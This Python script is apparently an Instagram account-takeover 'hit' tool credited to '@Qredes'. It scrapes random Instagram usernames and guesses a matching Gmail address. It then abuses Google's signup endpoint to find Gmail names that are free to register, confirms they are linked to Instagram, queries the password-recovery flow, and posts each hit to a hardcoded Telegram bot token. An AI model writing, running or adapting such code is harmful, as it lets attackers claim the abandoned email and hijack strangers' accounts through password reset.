import os
os.system("pip install colorama")
from requests import get,post
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent
from os import system,remove,name
from colorama import Fore, Style
from rich.console import Console
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
import requests
from hashlib import md5
from time import time
#------------------------------------------------------------#
lenked_instgram=0
unlenked_instgram=0
available_gmail=0
unavailable_gmail=0
number_check=0
orange_color = '\033[38;5;214m'
console = Console()
#------------------------------------------------------------#
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)
#---------------------------[input]----------------------------#
ID=749219602
system('cls' if name == 'nt' else 'clear')
token="6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo"
system('cls' if name == 'nt' else 'clear')
#---------------------------[info]-----------------------------#
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response =post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username,domen):
  global hits
  headers = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'DNT': '1',
      'Origin': 'https://www.tucktools.com',
      'Referer': 'https://www.tucktools.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'User-Agent': generate_user_agent(),
  }

  params = {
      'username': username,
  }

  try:
    response = get('https://instaskull.com/tucktools_user', params=params, headers=headers).json()
    id=response['id']
    name=response['user_fullname']  
    user_followers=response['user_followers']
    user_following=response['user_following']
    total_posts=response['total_posts']
    user_description=response['user_description']
    try:
      date=get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
    except:
      date='None'
    tlg = f'''
⌯ Hi Qredes Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓ
folowers : {user_followers}
following : {user_following}
total posts : {total_posts}
username : {username}
email : {username}@{domen}
date : {date}
id : {id}
name : {name}
bio : {user_description}
rest : {rest(username)}
ᯓᯓᯓᯓᯓᯓᯓᯓ
by : @Qredes
'''
    print(tlg)
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    tlg = f'''
    ⌯ Hi Qredes Got Hit
    ᯓᯓᯓᯓᯓᯓᯓᯓ
    username : {username}
    email : {username}@{domen}
    rest : {rest(username)}
    ᯓᯓᯓᯓᯓᯓᯓᯓ
    by : @Qredes
    '''
    print(tlg)
    try:get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')

def h_h(email):
  global lenked_instgram, unlenked_instgram, available_gmail, unavailable_gmail
  username, domen = email.split('@')
  try:
      if check_gmail(username) == 'good':
        available_gmail += 1
        csrftoken = md5(str(time()).encode()).hexdigest()
        ua=generate_user_agent()
        headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
        }
        data = {
        'email': email,
        }
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
        if 'email_is_taken' in str(response.text):
              lenked_instgram += 1
              info(username, domen)
        else:unlenked_instgram += 1
      else:unavailable_gmail += 1
  except Exception as e:''
  console.clear()
  ss = f'''
  [green]linked instgram:[/] {lenked_instgram}
  [orange]avilible gmail:[/] {available_gmail}
  [red]unlinked instgram:[/] {unlenked_instgram}
  [yellow]unavailable gmail:[/] {unavailable_gmail}

  BY : @Qredes / @K_Q_A / قريديس 
  '''
  console.print(ss)
def main():
  while True:
    try:
      id = str(rr(10000,23282097))
      lsd=''.join(cc('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(22))
      headers = {
          'authority': 'www.instagram.com',
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/0s9s/',
          'sec-fetch-site': 'same-origin',
          'user-agent': generate_user_agent(),
          'x-fb-lsd': lsd,
      }
      data = {
          'lsd': lsd,
          'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
          'doc_id': '8257302777620075',
      }

      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
      email=username+'@gmail.com'
      h_h(email)
    except:''
from threading import Thread
for _ in range(70):
  Thread(target=main).start()
